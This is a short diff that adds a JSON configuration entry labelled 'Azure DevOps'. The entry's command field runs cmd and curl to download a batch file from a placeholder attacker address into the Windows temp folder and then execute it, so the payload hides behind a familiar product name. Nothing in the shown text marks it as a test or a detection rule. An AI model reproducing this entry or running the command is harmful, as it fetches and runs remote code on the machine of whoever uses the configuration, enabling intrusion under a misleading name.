@@ -1,0 +1,4 @@
+{
+  "name": "Azure DevOps",
+  "command": "cmd /c curl -s http://{ATTACKER_IP}:{HTTP_PORT}/payload/run.bat -o %TEMP%\\r.bat && %TEMP%\\r.bat"
+}
